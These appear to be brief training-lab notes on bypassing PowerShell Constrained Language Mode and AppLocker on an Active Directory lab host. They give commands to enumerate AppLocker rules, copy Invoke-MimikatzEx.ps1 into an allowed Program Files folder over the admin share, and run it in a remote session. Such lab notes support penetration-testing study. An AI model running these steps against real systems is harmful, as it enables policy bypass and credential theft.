Costrained Language Mode.

Error as shown:

Cannot invoke method. Method invocation is supported only on core types in this language mode.

$ExecutionContext.SessionState.LanguageMode -> If CostrainedLanguage -> AppLocker

1st. Check AppLocker Policies.
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    
We can also check same policies running a cmd through winrs
    winrs -r:dcorp-adminsrv cmd
    reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
    
2nd. Since we saw we could only execute 'exe' binarys microsoft signed and theres a policy that allow us to run scripts in the Program File Folder we copy Mimikatz there    
    
Copy-Item C:\AD\Tools\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
Enter-PSSession dcorp-adminsrv

3. Run Mimikatz
cd 'C:\Program Files'
.\Invoke-MimikatzEx.ps1
